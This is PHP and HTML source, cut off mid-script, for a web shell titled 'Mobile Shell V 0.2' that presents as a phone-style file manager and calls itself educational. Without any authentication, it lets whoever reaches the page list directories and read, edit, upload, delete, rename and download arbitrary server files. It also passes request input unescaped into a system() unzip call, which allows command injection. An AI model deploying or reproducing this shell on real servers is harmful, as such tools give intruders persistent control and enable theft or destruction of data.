<?php
error_reporting(0);
	function filemanager(){
			$files = '';
			$dirs = '';
			$dir = getcwd();
			$path = str_replace("\\", "/", $dir);
			echo '
				<nav class="navbar navbar-inverse">
			  		<div class="container-fluid">
			  		  	<div class="navbar-header">
			  		   		<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
			   			    	<span class="icon-bar"></span>
			        			<span class="icon-bar"></span>
			       				<span class="icon-bar"></span>                        
			      			</button>
			      			<div class="navbar-brand" onclick="gotohome(\''.dirname($_SERVER["SCRIPT_FILENAME"]).'\')">Home</div>
			    		</div>
			    		<div class="collapse navbar-collapse" id="myNavbar">
			      			<ul class="nav navbar-nav">
			      			<li onclick="crossfm()"><a><span class="fa fa-remove"></span> CLOSE</a></li>
			        			<li onclick="showAddFile(\''.$path.'\')"><a><span class="fa fa-upload"></span> ADD FILES</a>
			        			</li>
			        			<li onclick="Confirm_newFile(\''.$path.'\')"><a><span class="fa fa-plus"></span> Create File</a></li>
			        			<li onclick="Confirm_newFolder(\''.$path.'\')"><a><span class="fa fa-plus"></span> Create Folder</a></li>			        			<li onclick="deleteMulti()" class="deleteMulti"><a><span class="fa fa-unlink"></span> DELETE</a></li>
			      			</ul>
			      			<div class="col-sm-3 col-md-3 pull-right">
							        <div class="input-group">
							            <input type="text" class="form-control searchInput" placeholder="Search Your Files" name="srch-term" id="srch-term">
							            <div class="input-group-btn">
							                <button class="btn search btn-default" onclick="searchfile()"><i class="glyphicon glyphicon-search"></i></button>
							            </div>
							        </div>
					        </div>
			    		</div>
			  		</div>
				</nav><div class="WithoutSearching">';
			$i=0;
			$k=0;
			foreach(scandir($dir) as $key => $value){
					$perm = permi($dir."/".$value);
			      	if (is_dir($value))
			      	{
			      		$j = $i;
			      		$info = pathinfo($dir."\\".$value);
			      		$name = $value;
			      		$newdir = str_replace("\\", "/", $dir);
						$getLastModDir = filemtime($value);
						$time = date("d/m/Y H:i ",$getLastModDir);
						if (!$time) 
						{
							$time = "<font color=red>php version error</font>";
						}
						$open = "";
						$opena = ""; 
						$options = "";
						if (is_readable($value)) 
						{
							$open = "onClick='changedir(\"".$newdir."/".$name."\")'";
							$opena = "oncontextmenu='showinfo(\".fileinfo".$j++.",1\");return false;'";
							$options = "<img src='https://ijazurrahim.com/mobiShell/icons/selection.png' class='foldermore' onclick='showinfo(\".fileinfo".--$j.",1\")' align='right'><div class='hidden deleteMultiPath".$k++."'>".$newdir."</div>";
							if ($value != "." && $value != "..") 
							{
								$options.="<input class='hidden pull-right deletefiles' type='checkbox' name='deletef[]' value='".$newdir."/".$name."' align='right'>";
							}
						}
						$dirs .="<div class='folder' ".$opena.">
									<img src='https://ijazurrahim.com/mobiShell/icons/folder.png' ".$open." align='left' alt='' vspace='0'>
									<font class='fname' ".$open."> &nbsp;".$name."</font>".$options."<br><br><font class='folderinfo'>&nbsp;&nbsp;".$time."</font> &nbsp;&nbsp;&nbsp;&nbsp;".$perm."</font><hr>
								</div>
								<div class='fileinfo hidden fileinfo".$i++."' >
									<li onclick='changedir(\"".$newdir."/".$name."\")'><div class='fileli'>Open</div></li>
									<li onclick='confirm_delete(\"".$newdir."\",\"".$name."\")'><div class='fileli'>Delete</div></li>
									<li onclick='rename(\"".$newdir."\",\"".$name."\")'><div class='fileli'>Rename</div></li>
									<li onclick='properties(\"".$newdir."/".$name."\")'><div class='fileli'>Properties</div></li>
									<li onclick='cancelfileinfo()'><div class='fileli'>Cancel</div></li>
								</div>";
					}
					elseif (is_file($value)) 
					{
						$info = pathinfo($dir."\\".$value);
			      		$newdir = str_replace("\\", "/", $dir);
			      		$name = $value;
			      		if(!$info['extension'])
			      		{
			      			$extension = "NULL";
			      			$file = "file";
			      		}
			      		else
			      		{
			      			$extension = $info['extension'];
			      			switch ($extension) {
			      				case "png":
			      				case "jpg":
			      				case "bmp":
			      				case "gif":
			      				case "jpeg":
			      				case "ico":
			      					$file = "image";
			      					break;
			      				case "txt":
			      					$file = "text";
			      					break;
			      				case "exe":
			      					$file = "binary";
			      					break;
			      				case "css":
			      					$file = "css";
			      					break;
			      				case "js":
			      					$file = "js";
			      					break;
			      				case "html":
			      					$file = "html";
			      					break;
			      				case "php":
			      					$file = "php";
			      					break;
			      				case "zip":
			      					$file = "zip";
			      					break;
			      				default:
			      					$file = "file";
			      					break;
			      			}
			      		}
			      		$j = $i;
			      		$open = '';
			      		$opena = '';
			      		$editor = '';
			      		$extensions = array("text/plain","text/x-php","text/html","text/css","application/javascript","application/json","application/xml","image/svg+xml","image/svg+xml","application/octet-stream","text/x-asm","inode/x-empty");
			      		if (function_exists("mime_content_type")) {
				      		if (in_array(mime_content_type($value), $extensions))
				      		{ 
				      			$open = 'onClick="openfile(\''.$newdir.'/'.$name.'\')"';
				      			$opena = '';
				      			$editor = '<li onclick="openeditora(\''.$newdir.'/'.$name.'\')"><div class="fileli">Edit</div></li>';
				      		}
				      		

			      		}
			      		else
			      		{

			      			$open = 'onClick="openfile(\''.$newdir.'/'.$name.'\')"';
			      			$editor = '<li onclick="openeditora(\''.$newdir.'/'.$name.'\')"><div class="fileli">Edit</div></li>';
			      		}
			      		if (strtolower(substr($value, -4)) == '.zip'){
			      			$open = 'onClick="openzip(\''.$newdir.'\',\''.$name.'\')"';
			      			$editor = '<li onclick="openzipa(\''.$newdir.'\',\''.$name.'\')"><div class="fileli">Extract</div></li>';
				      	}
						$getLastModDir = filemtime($value);
						$time = date("d/m/Y H:i ",$getLastModDir);
						$files.='<div class="file" oncontextmenu="showinfo(\'.fileinfo'.$j++.',2\');return false;">
								<img src="https://ijazurrahim.com/mobiShell/icons/'.$file.'.png" '.$open.' class="fileic" align="left" alt="" vspace="0">
								<font id="fname" '.$open.'> &nbsp;'.$name.' </font><img src="https://ijazurrahim.com/mobiShell/icons/selection.png" onclick="showinfo(\'.fileinfo'.--$j.',2\')" class="foldermore" align="right"><input class="hidden pull-right deletefiles" type="checkbox" name="deletef[]" value="'.$newdir.'/'.$name.'" align="right"><br><br>
								<font class="folderinfo">&nbsp;&nbsp;'.$time.' Type: '.$extension.'</font> '.$perm.'</font><hr>
							</div>
							<div class="fileinfo hidden fileinfo'.$i++.'" >'.$editor.'<li onclick="confirm_delete(\''.$newdir.'\',\''.$name.'\')"><div class="fileli">Delete</div></li>
								<li onclick="rename(\''.$newdir.'\',\''.$name.'\')"><div class="fileli">Rename</div></li>
								<li onclick="download(\''.$newdir.'/'.$name.'\')"><div class="fileli">Download</div></li><li onclick="properties(\''.$newdir.'/'.$name.'\')"><div class="fileli">Properties</div></li>
								<li onclick="cancelfileinfo(\'.fileinfo'.$j++.'\')"><div class="fileli">Cancel</div></li>
							</div>';
					
				}
			}
			echo $dirs;
			echo $files;
			echo "</div>";
	}
		if (isset($_POST['dir'])) {
			chdir($_POST['dir']);
			filemanager();
			die();
		}
		if (isset($_POST['file'])) {
			$dir = $_POST['file'];
			$info = pathinfo($_POST['file']);
			$content = htmlspecialchars(file_get_contents($_POST['file']));
			$name = $info['basename'];
			echo '
			<div class="editor-head"> 
				<font class="file-name">'.$name.'</font><font class="cross" onclick="closeeditor()">X</font>
			</div>
			<div class="editor-footer" onclick="save_file(\''.$dir.'\')">Save</div>
			<textarea rows=15 id="textareaCode" class="editor-body col-xs-12">'.$content.'</textarea>';
		die();
		}
		if (isset($_POST['filename'])) 
		{
			$file = fopen($_POST['filepath'],"w");
			if(fwrite($file,htmlspecialchars_decode($_POST['filecontent'])))
			{
				echo 1;
			}
			else
			{
				echo 2;
			}
			fclose($file);
			die();
		}
		        function permi($directory){
	$perms = fileperms($directory);
   if (!is_readable($directory))
       $info = "<font color=red  class='folderinfo'> ";
   else
       $info = "<font color=green  class='folderinfo'> ";
switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info .= 's';
        break;
    case 0xA000: // symbolic link
        $info .= 'l';
        break;
    case 0x8000: // regular
        $info .= 'r';
        break;
    case 0x6000: // block special
        $info .= 'b';
        break;
    case 0x4000: // directory
        $info .= 'd';
        break;
    case 0x2000: // character special
        $info .= 'c';
        break;
    case 0x1000: // FIFO pipe
        $info .= 'p';
        break;
    default: // unknown
        $info .= 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return($info);
}
if (isset($_GET['downfile'])) 
{
	$file = $_GET['downfile'];
if (file_exists($file)) 
{
	if (function_exists("mime_content_type")) {
		$type = mime_content_type($file);
	}
	else
		$type = 'application/octet-stream';
    header('Content-Description: File Transfer');
    header('Content-Type: "'.$type.'"');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: no-cache, must-revalidate');
    header('Pragma: no-cache');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    die();
}
}
if (isset($_POST['oldname'])) 
{
	if(rename($_POST['newname'],$_POST['oldname']))
		echo 1;
	else
		echo 2;
	die();
}
if (isset($_POST['deletefile'])) 
{	
	if (is_dir($_POST['deletefile']))
	{
	    
	    	function rrmdir($dir){
	    		$objects = scandir($dir); 
		     	foreach ($objects as $object) 
		     	{ 
		       		if ($object != "." && $object != "..") 
		       		{ 
		         		if (is_dir($dir."/".$object))
		           			rrmdir($dir."/".$object);
		           		else
		           			unlink($dir."/".$object);
		       		}
		    	}
		    	if(rmdir($dir))
		    		return 1;
		    	else
		    		return 2;
     		}
		    echo rrmdir($_POST['deletefile']);
	    

	}
	elseif(unlink($_POST['deletefile']))
		echo 1;
	else
		echo 2;
	die();
}
if (isset($_POST['zip'])) {
	$zip = new ZipArchive;
	$path = dirname($_POST['zip']);
	if ($zip->open($_POST['zip']))
	{
		if ($zip->extractTo($path))
			echo 1;
		elseif(system("unzip ".$_POST['zip']." -d ".$path."/"))
			echo 1;
		else
			echo 2;
		$zip->close();
	}
	elseif(system("unzip ".$_POST['zip']." -d ".$path."/"))
		echo 1;
	else
		echo 2;
	die();
}
if (isset($_POST['properties']))
{
	if (function_exists("mime_content_type")){
		$type = mime_content_type($_POST['properties']);
		if ($type=='directory') {
			$dir = new RecursiveIteratorIterator(
			    new RecursiveDirectoryIterator($_POST['properties']), 
			    RecursiveIteratorIterator::LEAVES_ONLY,
			    RecursiveIteratorIterator::CATCH_GET_CHILD);
			$size = 0;
			$subfiles = 0;
			$subdirs=0;
			foreach ( $dir as $key=>$file ) 
			{
			    if (!is_readable($file))
			    	continue;
			    if (basename($file)=='.') {
			    	$subdirs +=1;
    				continue;
    			}
    			if (basename($file)=='..')
    				continue;
			    $size += $file->getSize();
			    $subfiles +=1;
			}
			$contains = "<tr>
							<th>Contains: </th>
							<td>".($subdirs-1)." folder(s) / ".$subfiles." file(s)</td>
						</tr>";
		}
		else
		{
			$size = filesize($_POST['properties']);
			$contains = '';
		}
		function human_filesize($bytes, $decimals = 2)
		{
		  $sz = 'BKMGTP';
		  $factor = floor((strlen($bytes) - 1) / 3);
		  return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$sz[$factor];
		}
		$size = human_filesize($size);
		if (function_exists("posix_getpwuid"))
		{
			$owner = " - ".posix_getpwuid(fileowner($_POST['properties']))['name'];
			$group = " - ".posix_getpwuid(filegroup($_POST['properties']))['name'];
		}
		else
		{
			$owner='';
			$group='';
		}
	}
	$perms = fileperms($_POST['properties']);
	$oRead = (($perms & 0x0100) ? 'checked' : ' ');
	$oWrite = (($perms & 0x0080) ? 'checked' : ' ');
	$oExecute = (($perms & 0x0040) ?
	            (($perms & 0x0800) ? ' ' : 'checked' ) :
	            (($perms & 0x0800) ? ' ' : ' '));
	$gRead = (($perms & 0x0020) ? 'checked' : ' ');
	$gWrite = (($perms & 0x0010) ? 'checked' : ' ');
	$gExecute = (($perms & 0x0008) ?
	            (($perms & 0x0400) ? ' ' : 'checked' ) :
	            (($perms & 0x0400) ? ' ' : ' '));
	$wRead = (($perms & 0x0004) ? 'checked' : '');
	$wWrite = (($perms & 0x0002) ? 'checked' : '');
	$wExecute = (($perms & 0x0001) ?
	            (($perms & 0x0200) ? '' : 'checked' ) :
 	            (($perms & 0x0200) ? '' : ''));
	echo "<div class='fileproperty'>
			<li class='infopro' onclick='infopro()'><div class='fileli'>Info</div></li>
			<li class='permpro' onclick='permpro()'><div class='fileli'>Permissions</div></li>
			<table class='table tableinfo'>
				<tr>
					<th>Name: </th>
					<td>".basename($_POST['properties'])."</td>
				</tr>
				<tr>
					<th>Path: </th>
					<td>".dirname($_POST['properties'])."</td>
				</tr>
				<tr>
					<th>Type: </th>
					<td>".$type."</td>
				</tr>
				<tr>
					<th>Size: </th>
					<td>".$size."</td>
				</tr>
				".$contains."
				<tr>
					<th>Accessed: </th>
					<td>".date("d/m/Y H:i ",fileatime($_POST['properties']))."</td>
				</tr>
				<tr>
					<th>Modified: </th>
					<td>".date("d/m/Y H:i ",filemtime($_POST['properties']))."</td>
				</tr>
				<tr>
					<th>Changed: </th>
					<td>".date("d/m/Y H:i ",filectime($_POST['properties']))."</td>
				</tr>
			</table>
			<table class='table tableperm hidden'>
				<tr>
					<th>Owner: </th>
					<td>".fileowner($_POST['properties']).$owner."</td>
				</tr>
				<tr>
					<th>Group: </th>
					<td>".filegroup($_POST['properties']).$owner."</td>
				</tr>
				<tr>
					<td></td>
					<td style='font-weight:bolder'>R</td>
					<td style='font-weight:bolder'>W</td>
					<td style='font-weight:bolder'>X</td>
				</tr>
				<tr>
					<th>Owner</th>
					<td><input type='checkbox' disabled ".$oRead."></td>
					<td><input type='checkbox' disabled ".$oWrite."></td>
					<td><input type='checkbox' disabled ".$oExecute."></td>
				</tr>
				<tr>
					<th>Group</th>
					<td><input type='checkbox' disabled ".$gRead."></td>
					<td><input type='checkbox' disabled ".$gWrite."></td>
					<td><input type='checkbox' disabled ".$gExecute."></td>
				</tr>
				<tr>
					<th>Others</th>
					<td><input type='checkbox' disabled ".$wRead."></td>
					<td><input type='checkbox' disabled ".$wWrite."></td>
					<td><input type='checkbox' disabled ".$wExecute."></td>
				</tr>
			</table>
			<li class='proin' onclick='cancelproperty()'><div class='fileli'>Cancel</div></li>
		</div>";
	die();
}
if (isset($_FILES['file-0'])) 
{
	$count = count($_FILES);
	$resp = 0;
	for ($i = 0; $i < $count; $i++) 
	{
		if(move_uploaded_file($_FILES['file-'.$i]['tmp_name'], $_POST['path']."/".basename($_FILES['file-'.$i]['name'])))
			$resp += 1;
		else
			$resp += 0;
	}
	echo $resp;
	die();
}
if (isset($_POST['search']))
{
	if (empty($_POST['search'])) {
		echo "Empty";
		die();
	}
	$files = '';
	$dirs = '';
	$dir = $_POST['searchPath'];
	$countFiles=0;
	echo "<div class='searchExplorer'>";
	$path = str_replace("\\", "/", $dir);
	$i=0;
	$k=0;
	foreach(scandir($dir) as $key => $value)
	{
		if (stristr($value,$_POST['search']))
		{	
			$countFiles+=1;
			$perm = permi($dir."/".$value);
			if (is_dir($dir."/".$value))
			{
				$j = $i;
				$info = pathinfo($dir."\\".$value);
				$name = $value;
				$newdir = str_replace("\\", "/", $dir);
				$getLastModDir = filemtime($dir."/".$value);
				$time = date("d/m/Y H:i ",$getLastModDir);
				if (!$time) 
				{
					$time = "<font color=red>php version error</font>";
				}
				$open = "";
				$opena = ""; 
				$options = "";
				if (is_readable($dir."/".$value)) 
				{
					$open = "onClick='changedir(\"".$newdir."/".$name."\")'";
					$opena = "oncontextmenu='showinfo(\".fileinfo".$j++.",1\");return false;'";
					$options = "<img src='https://ijazurrahim.com/mobiShell/icons/selection.png' class='foldermore' onclick='showinfo(\".fileinfo".--$j.",1\")' align='right'><div class='hidden deleteMultiPath".$k++."'>".$newdir."</div>";
					if ($value != "." && $value != "..") 
					{
						$options.="<input class='hidden pull-right deletefiles' type='checkbox' name='deletef[]' value='".$newdir."/".$name."' align='right'>";
					}
				}
				$dirs .="<div class='folder' ".$opena.">
				<img src='https://ijazurrahim.com/mobiShell/icons/folder.png' ".$open." align='left' alt='' vspace='0'>
				<font class='fname' ".$open."> &nbsp;".$name."</font>".$options."<br><br><font class='folderinfo'>&nbsp;&nbsp;".$time."</font> &nbsp;&nbsp;&nbsp;&nbsp;".$perm."</font><hr>
				</div>
				<div class='fileinfo hidden fileinfo".$i++."' >
				<li onclick='changedir(\"".$newdir."/".$name."\")'><div class='fileli'>Open</div></li>
				<li onclick='confirm_delete(\"".$newdir."\",\"".$name."\")'><div class='fileli'>Delete</div></li>
				<li onclick='rename(\"".$newdir."\",\"".$name."\")'><div class='fileli'>Rename</div></li>
				<li onclick='properties(\"".$newdir."/".$name."\")'><div class='fileli'>Properties</div></li>
				<li onclick='cancelfileinfo()'><div class='fileli'>Cancel</div></li>
				</div>";
			}
			elseif (is_file($dir."/".$value)) 
			{
				$info = pathinfo($dir."\\".$value);
				$newdir = str_replace("\\", "/", $dir);
				$name = $value;
				if(!$info['extension'])
				{
					$extension = "NULL";
					$file = "file";
				}
				else
				{
					$extension = $info['extension'];
					switch ($extension)
					{
						case "png":
						case "jpg":
						case "bmp":
						case "gif":
						case "jpeg":
						case "ico":
						$file = "image";
						break;
						case "txt":
						$file = "text";
						break;
						case "exe":
						$file = "binary";
						break;
						case "css":
						$file = "css";
						break;
						case "js":
						$file = "js";
						break;
						case "html":
						$file = "html";
						break;
						case "php":
						$file = "php";
						break;
						case "zip":
						$file = "zip";
						break;
						default:
						$file = "file";
						break;
					}
				}
				$j = $i;
				$open = '';
				$opena = '';
				$editor = '';
				$extensions = array("text/plain","text/x-php","text/html","text/css","application/javascript","application/json","application/xml","image/svg+xml","image/svg+xml","application/octet-stream","text/x-asm","inode/x-empty");
				if (function_exists("mime_content_type"))
				{
					if (in_array(mime_content_type($dir."/".$value), $extensions))
					{ 
						$open = 'onClick="openfile(\''.$newdir.'/'.$name.'\')"';
						$opena = '';
						$editor = '<li onclick="openeditora(\''.$newdir.'/'.$name.'\')"><div class="fileli">Edit</div></li>';
					}
				}
				else
				{
					$open = 'onClick="openfile(\''.$newdir.'/'.$name.'\')"';
					$editor = '<li onclick="openeditora(\''.$newdir.'/'.$name.'\')"><div class="fileli">Edit</div></li>';
				}
				if (strtolower(substr($value, -4)) == '.zip')
				{
					$open = 'onClick="openzip(\''.$newdir.'\',\''.$name.'\')"';
					$editor = '<li onclick="openzipa(\''.$newdir.'\',\''.$name.'\')"><div class="fileli">Extract</div></li>';
				}
				$getLastModDir = filemtime($dir."/".$value);
				$time = date("d/m/Y H:i ",$getLastModDir);
				$files.='<div class="file" oncontextmenu="showinfo(\'.fileinfo'.$j++.',2\');return false;">
				<img src="https://ijazurrahim.com/mobiShell/icons/'.$file.'.png" '.$open.' class="fileic" align="left" alt="" vspace="0">
				<font id="fname" '.$open.'> &nbsp;'.$name.' </font><img src="https://ijazurrahim.com/mobiShell/icons/selection.png" onclick="showinfo(\'.fileinfo'.--$j.',2\')" class="foldermore" align="right"><input class="hidden pull-right deletefiles" type="checkbox" name="deletef[]" value="'.$newdir.'/'.$name.'" align="right"><br><br>
				<font class="folderinfo">&nbsp;&nbsp;'.$time.' Type: '.$extension.'</font> '.$perm.'</font><hr>
				</div>
				<div class="fileinfo hidden fileinfo'.$i++.'" >'.$editor.'<li onclick="confirm_delete(\''.$newdir.'\',\''.$name.'\')"><div class="fileli">Delete</div></li>
				<li onclick="rename(\''.$newdir.'\',\''.$name.'\')"><div class="fileli">Rename</div></li>
				<li onclick="download(\''.$newdir.'/'.$name.'\')"><div class="fileli">Download</div></li><li onclick="properties(\''.$newdir.'/'.$name.'\')"><div class="fileli">Properties</div></li>
				<li onclick="cancelfileinfo(\'.fileinfo'.$j++.'\')"><div class="fileli">Cancel</div></li>
				</div>';

			}
		}
	}
	if($countFiles==0)
	{
		echo "<div class='row col-xs-10 col-xs-offset-1 alert label-warning'>Search Not Found</div>";
	}
	echo $dirs;
	echo $files."</div>";
	die();
}
if (isset($_POST['newFile']))
{
	if (!empty($_POST['newFile'])) {
		if (touch($_POST['newFilePath']."/".$_POST['newFile']))
			echo 1;
		else
			echo 2;
	}
	else
		echo 2;
	die();
}
if (isset($_POST['newFolder']))
{
	if (!empty($_POST['newFolder']))
	{
		if (mkdir($_POST['newFolderPath']."/".$_POST['newFolder']))
			echo 1;
		else
			echo 2;
	}
	else
		echo 2;
	die();
}
?><!DOCTYPE HTML>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="robots" content="index, follow"/>
	<meta name="rating" content="General"/>
	<meta name="revisit-after" content="1 day"/>
	<meta name="classification" content="Ijaz Ur Rahim"/>
	<meta name="keyword" content="Ijaz Ur Rahim,Young Programmer,Developer,Programmer,Young,Hacker,The Alien"/>
	<META HTTP-EQUIV="Expires" CONTENT="-1">
	<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
	<meta name="description" content="This Shell is coded by The Alien and is an open source, anyone can modify or edit the shell,This Shell is coded only for educational purpose and to make security researching more interesing,if anyone used it for illegal purpose then they are responsible"/>
	<meta name="googlebot" content="index,follow"/>
	<meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no">
	<meta name="robots" content="all"/>
	<meta name="robots schedule" content="auto"/>
	<meta name="distribution" content="global"/>
	<meta name="Author" content="Ijaz Ur Rahim">
	<title>Mobile Shell V 0.2 | The Alien	</title>
	<meta http-equiv="imagetoolbar" content="no">
	<link rel="SHORTCUT ICON" href="https://ijazurrahim.com/mobiShell/icons/icon.png">
	<meta property="og:title" content="Mobile Shell V 0.2 | The Alien" />
	<link rel="canonical" href="https://www.ijazurrahim.com" />
	<meta property="og:url" content="<?php if ($_SERVER['SERVER_PROTOCOL']=='HTTP/1.1') echo "http://"; else echo "https://";echo $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']; ?>" />
	<meta property="og:image" content="icons/bg.png" />
	<meta property="og:description" content="This Shell is coded by The Alien and is an open source, anyone can modify or edit the shell,This Shell is coded only for educational purpose and to make security researching more interesing,if anyone used it for illegal purpose then they are responsible" />
	<meta property="og:type" content="website" />
	<link href="https://fonts.googleapis.com/css?family=Audiowide|Ceviche+One|Exo+2|Freckle+Face|Open+Sans|Roboto" rel="stylesheet" />
	 <!-- Bootstrap -->
    <link href="https://ijazurrahim.com/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" href="http://fontawesome.io/assets/font-awesome/css/font-awesome.css">
	<link rel="stylesheet" href="https://code.jquery.com/ui/1.11.4/themes/smoothness/jquery-ui.css">
 	<link rel="stylesheet" href="https://code.jquery.com/ui/1.9.2/themes/base/jquery-ui.css" />
    <script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
	<link rel="stylesheet" href="https://www.w3schools.com/lib/codemirror.css">
    <link href="https://ijazurrahim.com/mobiShell/css/style.css" rel="stylesheet">
	<script src="https://www.w3schools.com/lib/codemirror.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <script src="https://ijazurrahim.com/js/jquery-3.2.1.min.js"></script>
	<style type="text/css">
		.CodeMirror
		{
			position: absolute;
			font-size: 12px;
			right: 0px;
			left: 0px;
			bottom: 0px;
			top: 70px;
			outline-color: rgba(0,255,0,0.8);
			height: auto;
		}
	</style>
</head>
<body onload="startTime()"> 
		<div class="col-lg-12 noti-bar">
			<div class="noti-icons">
				<img src="https://ijazurrahim.com/mobiShell/icons/battery.png" class="battery"><img src="https://ijazurrahim.com/mobiShell/icons/wifi.png" class="wifi"><span id="txt"></span>
			</div>
		</div>
		<div class="apps row ">
			<div class="col-lg-4 filemanager">
				<img src="https://ijazurrahim.com/mobiShell/icons/filemanager.png" alt="">
				<font>File Manager</font>
			</div>
		</div>
		<div class="explorer row hidden">
		<?php
			filemanager();
		?>
		</div>
		<div class="row editor col-lg-10 col-lg-offset-1 hidden">
			
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 file-error label-danger label">
			Error in Saving File
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 file-success label-success label">
			File Saved Succesfully
		</div>
		<div class="rename col-xs-10 col-xs-offset-1 hidden">
			<div class="col-xs-12 oldname" contenteditable="true"></div>
			<div class="col-xs-12 newname" contenteditable="true"></div>
			<div class="col-xs-6 cancel btn btn-danger" onclick="hiderename()">Cancel</div>
			<div class="path hidden"></div>
			<div class="col-xs-6 rename-btn btn btn-success" onclick="renamefile()">Rename</div>
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 rename-error label-danger label">
			Error in Renaming File
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 rename-success label-success label">
			File Renamed Succesfully
		</div>
		<div class="confirm-delete col-xs-10 col-xs-offset-1 hidden">
			<div class="col-xs-12 confirm">Are You sure to delete this file or directory?</div>
			<div class="filepath1 hidden"></div>
			<div class="filepath2 hidden"></div>
			<div class="col-xs-6 cancel btn btn-danger" onclick="hidedelete()">Cancel</div>
			<div class="col-xs-6 rename-btn btn btn-success" onclick="deletefile()">Delete</div>
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 delete-error label-danger label">
			Error in Deleting File
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 delete-success label-success label">
			File Deleted Succesfully
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 loading label-success label">
			Loading Please Wait
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 zip-error label-danger label">
			Error in Extracting File
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 zip-success label-success label">
			File Extracted Succesfully
		</div>
		<div class="add-files col-xs-10 col-xs-offset-1 form-group hidden">
			<div class="confirm">Upload Your Multiple Files Here upto 3MB each and 10 MB all.</div>
			<input class="input-group confirm col-xs-12" multiple="true" type="file" name="files[]">
			<div class="hidden add-file-path"></div>
			<div class="alert label-danger btn col-xs-6" onclick="closeAddFile()">Cancel</div>
			<div class="alert label-success btn col-xs-6" onclick="addFiles()">Add File</div>
		</div>
		<div class="newFile-panel col-xs-10 col-xs-offset-1 hidden">
			<div class="col-xs-12 newFile" contenteditable="true"></div>
			<div class="col-xs-6 cancel btn btn-danger" onclick="hideNewFile()">Cancel</div>
			<div class="newFilePath hidden"></div>
			<div class="col-xs-6 rename-btn btn btn-success" onclick="newFile()">Create</div>
		</div>
		<div class="newFolder-panel col-xs-10 col-xs-offset-1 hidden">
			<div class="col-xs-12 newFolder" contenteditable="true"></div>
			<div class="col-xs-6 cancel btn btn-danger" onclick="hidenewFolder()">Cancel</div>
			<div class="newFolderPath hidden"></div>
			<div class="col-xs-6 rename-btn btn btn-success" onclick="newFolder()">Create</div>
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 newFile-error label-danger label">
			Error in Creating File
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 newFile-success label-success label">
			File Created Succesfully
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 newFolder-error label-danger label">
			Error in Creating Folder
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 newFolder-success label-success label">
			Folder Created Succesfully
		</div>
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://ijazurrahim.com/js/bootstrap.min.js"></script>
	<script src="https://code.jquery.com/jquery-1.10.2.js"></script>
    <script src="https://code.jquery.com/ui/1.11.4/jquery-ui.js"></script>
    <script src="https://ijazurrahim.com/js/jquery.ui.touch-punch.min.js"></script>
	<script type="text/javascript" src="https://www.jquery-az.com/boots/js/bootstrap-filestyle.min.js"> </script>
	<script type="text/javascript">
		function colorcoding()
		{
  			window.editor = CodeMirror.fromTextArea(
  				$("textarea")[0], 
	  			{
				  	lineNumbers:true,
				    lineWrapping: true,
				    smartIndent: false,
				    addModeClass: true
				});
		}

		function fName(){
			var cfName = '<?php echo basename($_SERVER['PHP_SELF']); ?>';
			return cfName;
		}
    		function changedir(a)
		{
			var dir = a;
			$(".loading").show(1000);
			$.post(fName(),
			 {dir: dir},
			 function(data) {
				$(".loading").hide(1000);
			 	$(".explorer").empty();
			 	$(".explorer").append(data);
			});
		}
		function closeeditor(){
			$( ".editor" ).addClass('hidden');
		}
		function save_file(c){
			var filename = $(".file-name").text();
			var filecontent = window.editor.getValue();
			var filepath = c;
			$(".loading").show(1000);
			$.post(fName(),
			 {filename: filename,filecontent:filecontent,filepath:filepath},
			 function(data) {
					$(".loading").hide(1000);
			 	if (data==1) {
			 		$(".file-success").show(1000);
			 		setTimeout(function() {
			 		$(".file-success").hide(1000);
			 		}, 2000);
			 	}
			 	if (data==2) {
			 		$(".file-error").show(1000);
			 		setTimeout(function() {
			 			$(".file-error").hide(1000);
			 		}, 2000);
			 	}
			});
		}
		function openfile(b){
			 	
			var file = b;
